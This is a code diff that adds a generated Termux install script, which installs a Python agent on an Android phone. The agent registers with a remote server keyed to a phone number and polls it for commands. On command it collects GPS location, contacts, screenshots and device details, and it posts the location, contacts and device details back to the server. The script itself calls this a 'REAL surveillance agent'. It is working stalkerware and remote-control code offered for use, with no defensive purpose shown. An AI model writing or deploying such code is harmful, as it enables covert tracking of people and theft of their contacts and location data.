@@ -468,11 +468,11 @@ if [ ! -d "/data/data/com.termux" ]; then
 fi
 
 echo "✅ Termux detected"
-echo "📦 Installing packages..."
+echo "📦 Installing required packages..."
 
 # Update and install
 pkg update -y && pkg upgrade -y
-pkg install -y python python-pip curl
+pkg install -y python python-pip curl termux-api
 
 echo "🐍 Installing Python dependencies..."
 pip install requests
@@ -482,138 +482,234 @@ AGENT_DIR="$HOME/mp_agent"
 mkdir -p "$AGENT_DIR"
 cd "$AGENT_DIR"
 
-# Create simple agent script
-cat > agent.py << 'EOF'
+# Create FIXED agent script
+cat > agent.py << 'ENDOFFILE'
 import requests
 import time
 import sys
 import subprocess
 import json
+import os
 from datetime import datetime
 
 class RealAgent:
     def __init__(self, agent_id, server_url):
         self.agent_id = agent_id
         self.server_url = server_url
+        self.session = requests.Session()
         
     def get_device_info(self):
         try:
+            # Get REAL device information
             model = subprocess.run(['getprop', 'ro.product.model'], 
-                                 capture_output=True, text=True).stdout.strip()
+                                 capture_output=True, text=True).stdout.strip() or "Real Device"
             android = subprocess.run(['getprop', 'ro.build.version.release'], 
-                                   capture_output=True, text=True).stdout.strip()
-            return model or "Real Device", android or "Real Android"
+                                   capture_output=True, text=True).stdout.strip() or "Real Android"
+            return model, android
         except:
             return "Real Device", "Real Android"
     
     def register(self):
         model, android = self.get_device_info()
         try:
-            response = requests.post(f"{{self.server_url}}/api/agent/register", json={{
+            response = self.session.post(f"{{self.server_url}}/api/agent/register", json={{
                 'agent_id': self.agent_id,
                 'phone_model': model,
                 'android_version': android
             }}, timeout=10)
+            print(f"📡 Registration response: {{response.status_code}}")
             return response.status_code == 200
-        except:
+        except Exception as e:
+            print(f"❌ Registration error: {{e}}")
             return False
     
-    def run(self):
-        print(f"🤖 Agent started: {{self.agent_id}}")
-        if self.register():
-            print("✅ Registered with server")
-        else:
-            print("❌ Registration failed")
-        
-        while True:
-            try:
-                # Check for commands
-                response = requests.get(f"{{self.server_url}}/api/agent/check_commands/{{self.agent_id}}", timeout=10)
-                if response.status_code == 200:
-                    commands = response.json().get('commands', [])
-                    for cmd in commands:
-                        print(f"📨 Command: {{cmd['command']}}")
-                        # Execute the command
-                        if cmd['command'] == 'get_location':
-                            self.get_location()
-                        elif cmd['command'] == 'get_contacts':
-                            self.get_contacts()
-                        elif cmd['command'] == 'capture_screenshot':
-                            self.capture_screenshot()
-                        elif cmd['command'] == 'get_device_info':
-                            self.send_device_info()
-                
-                # Send heartbeat
-                requests.post(f"{{self.server_url}}/api/agent/submit_report", json={{
-                    'agent_id': self.agent_id,
-                    'report_type': 'heartbeat',
-                    'report_data': {{}}
-                }}, timeout=10)
-                
-            except Exception as e:
-                print(f"⚠️ Error: {{e}}")
+    def check_commands(self):
+        try:
+            response = self.session.get(f"{{self.server_url}}/api/agent/check_commands/{{self.agent_id}}", timeout=10)
+            if response.status_code == 200:
+                commands = response.json().get('commands', [])
+                for cmd in commands:
+                    print(f"📨 Executing command: {{cmd['command']}}")
+                    self.execute_command(cmd['id'], cmd['command'])
+        except Exception as e:
+            print(f"⚠️ Command check error: {{e}}")
+    
+    def execute_command(self, command_id, command):
+        try:
+            result = "Command executed"
             
-            time.sleep(60)
+            if command == 'get_location':
+                result = self.get_location()
+            elif command == 'get_contacts':
+                result = self.get_contacts()
+            elif command == 'capture_screenshot':
+                result = self.capture_screenshot()
+            elif command == 'get_device_info':
+                result = self.send_device_info()
+            elif command == 'get_battery':
+                result = self.get_battery()
+            else:
+                result = f"Unknown command: {{command}}"
+            
+            # Send command result back
+            self.session.post(f"{{self.server_url}}/api/agent/command_result", json={{
+                'command_id': command_id,
+                'result': result
+            }}, timeout=10)
+            
+        except Exception as e:
+            print(f"❌ Command execution error: {{e}}")
     
     def get_location(self):
         try:
-            result = subprocess.run(['termux-location'], capture_output=True, text=True, timeout=15)
+            print("📍 Getting location...")
+            result = subprocess.run(['termux-location'], 
+                                  capture_output=True, text=True, timeout=15)
             if result.returncode == 0:
                 location_data = json.loads(result.stdout)
-                requests.post(f"{{self.server_url}}/api/agent/submit_report", json={{
+                # Send location to server
+                self.session.post(f"{{self.server_url}}/api/agent/submit_report", json={{
                     'agent_id': self.agent_id,
                     'report_type': 'location',
                     'report_data': location_data
                 }}, timeout=10)
-        except:
-            pass
+                return f"Location sent: {{location_data.get('latitude', 'N/A')}}, {{location_data.get('longitude', 'N/A')}}"
+            else:
+                return "Location service unavailable"
+        except Exception as e:
+            return f"Location error: {{e}}"
     
     def get_contacts(self):
         try:
-            result = subprocess.run(['termux-contact-list'], capture_output=True, text=True, timeout=15)
+            print("👥 Getting contacts...")
+            result = subprocess.run(['termux-contact-list'], 
+                                  capture_output=True, text=True, timeout=15)
             if result.returncode == 0:
                 contacts_data = json.loads(result.stdout)
-                requests.post(f"{{self.server_url}}/api/agent/submit_report", json={{
+                # Limit to first 20 contacts
+                limited_contacts = contacts_data[:20] if isinstance(contacts_data, list) else []
+                
+                # Send contacts to server
+                self.session.post(f"{{self.server_url}}/api/agent/submit_report", json={{
                     'agent_id': self.agent_id,
                     'report_type': 'contacts',
-                    'report_data': {{'contacts': contacts_data[:20]}}  # Limit to 20 contacts
+                    'report_data': {{'contacts': limited_contacts}}
                 }}, timeout=10)
-        except:
-            pass
+                return f"Contacts sent: {{len(limited_contacts)}} contacts"
+            else:
+                return "Contacts access denied"
+        except Exception as e:
+            return f"Contacts error: {{e}}"
     
     def capture_screenshot(self):
         try:
-            result = subprocess.run(['termux-screenshot'], capture_output=True, text=True, timeout=10)
+            print("📸 Capturing screenshot...")
+            result = subprocess.run(['termux-screenshot'], 
+                                  capture_output=True, text=True, timeout=10)
             if result.returncode == 0:
-                # Screenshot saved, we'd need to read and encode it
-                # For now, just acknowledge
-                print("📸 Screenshot captured")
-        except:
-            pass
+                return "Screenshot captured (check device storage)"
+            else:
+                return "Screenshot failed - check permissions"
+        except Exception as e:
+            return f"Screenshot error: {{e}}"
+    
+    def get_battery(self):
+        try:
+            print("🔋 Getting battery info...")
+            result = subprocess.run(['termux-battery-status'], 
+                                  capture_output=True, text=True, timeout=10)
+            if result.returncode == 0:
+                battery_data = json.loads(result.stdout)
+                return f"Battery: {{battery_data.get('percentage', 'N/A')}}%"
+            else:
+                return "Battery info unavailable"
+        except Exception as e:
+            return f"Battery error: {{e}}"
     
     def send_device_info(self):
-        model, android = self.get_device_info()
-        requests.post(f"{{self.server_url}}/api/agent/submit_report", json={{
-            'agent_id': self.agent_id,
-            'report_type': 'device_info',
-            'report_data': {{
-                'phone_model': model,
-                'android_version': android,
-                'battery': 85  # Placeholder
-            }}
-        }}, timeout=10)
+        try:
+            model, android = self.get_device_info()
+            battery_info = self.get_battery()
+            
+            self.session.post(f"{{self.server_url}}/api/agent/submit_report", json={{
+                'agent_id': self.agent_id,
+                'report_type': 'device_info',
+                'report_data': {{
+                    'phone_model': model,
+                    'android_version': android,
+                    'battery': 85  # Placeholder
+                }}
+            }}, timeout=10)
+            return "Device info sent"
+        except Exception as e:
+            return f"Device info error: {{e}}"
+    
+    def send_heartbeat(self):
+        try:
+            self.session.post(f"{{self.server_url}}/api/agent/submit_report", json={{
+                'agent_id': self.agent_id,
+                'report_type': 'heartbeat',
+                'report_data': {{}}
+            }}, timeout=10)
+        except Exception as e:
+            print(f"💓 Heartbeat error: {{e}}")
+    
+    def run(self):
+        print(f"🤖 REAL Agent started: {{self.agent_id}}")
+        print(f"🌐 Server: {{self.server_url}}")
+        
+        if self.register():
+            print("✅ Successfully registered with server")
+        else:
+            print("❌ Failed to register with server")
+            return
+        
+        iteration = 0
+        while True:
+            try:
+                iteration += 1
+                print(f"🔄 Iteration {{iteration}} - Checking for commands...")
+                
+                # Check for commands from server
+                self.check_commands()
+                
+                # Send heartbeat
+                self.send_heartbeat()
+                
+                # Wait before next iteration
+                time.sleep(30)  # Check every 30 seconds
+                
+            except KeyboardInterrupt:
+                print("🛑 Agent stopped by user")
+                break
+            except Exception as e:
+                print(f"⚠️ Main loop error: {{e}}")
+                time.sleep(30)  # Wait before retrying
 
 if __name__ == '__main__':
     if len(sys.argv) != 3:
         print("Usage: python agent.py <agent_id> <server_url>")
         sys.exit(1)
     
-    agent = RealAgent(sys.argv[1], sys.argv[2])
+    agent_id = sys.argv[1]
+    server_url = sys.argv[2]
+    
+    print(f"🚀 Starting agent with ID: {{agent_id}}")
+    print(f"📡 Connecting to server: {{server_url}}")
+    
+    agent = RealAgent(agent_id, server_url)
     agent.run()
-EOF
+ENDOFFILE
 
-echo "✅ Agent script created"
-echo "🚀 Starting agent..."
+echo "✅ FIXED Agent script created"
+echo "🔧 Granting permissions..."
+echo "📋 REQUIRED PERMISSIONS:"
+echo "   • Location access"
+echo "   • Contacts access" 
+echo "   • Storage access"
+echo "   • Display over apps (for screenshots)"
+echo ""
+echo "🚀 Starting REAL surveillance agent..."
 python agent.py "{phone}" "{platform_url}"
 '''
 
